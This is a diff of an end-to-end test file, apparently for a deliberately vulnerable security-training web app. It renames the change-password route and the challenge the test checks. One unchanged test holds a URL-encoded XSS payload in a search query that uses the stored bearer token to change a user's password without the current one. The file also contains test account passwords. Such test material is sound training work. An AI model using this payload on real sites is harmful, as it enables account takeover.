@@ -1,13 +1,13 @@
 const config = require('config')
 
-describe('/#/change-password', () => {
+describe('/#/privacy-security/change-password', () => {
   let currentPassword, newPassword, newPasswordRepeat, changeButton
 
   describe('as Bender', () => {
     protractor.beforeEach.login({ email: 'bender@' + config.get('application.domain'), password: 'OhG0dPlease1nsertLiquor!' })
 
     beforeEach(() => {
-      browser.get('/#/change-password')
+      browser.get('/#/privacy-security/change-password')
       currentPassword = element(by.id('currentPassword'))
       newPassword = element(by.id('newPassword'))
       newPasswordRepeat = element(by.id('newPasswordRepeat'))
@@ -27,7 +27,7 @@ describe('/#/change-password', () => {
   describe('challenge "csrf"', () => {
     protractor.beforeEach.login({ email: 'bender@' + config.get('application.domain'), password: 'genderBender' })
 
-    it('should be able to change password via XSS-powered CSRF-attack on password change without passing current password', () => {
+    it('should be able to change password via XSS-powered attack on password change without passing current password', () => {
       browser.get('/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E')
       browser.get('/#/login')
       element(by.id('email')).sendKeys('bender@' + config.get('application.domain'))
@@ -37,6 +37,6 @@ describe('/#/change-password', () => {
       expect(browser.getCurrentUrl()).toMatch(/\/search/)
     })
 
-    protractor.expect.challengeSolved({ challenge: 'CSRF' })
+    protractor.expect.challengeSolved({ challenge: 'Change Bender\'s Password' })
   })
 })
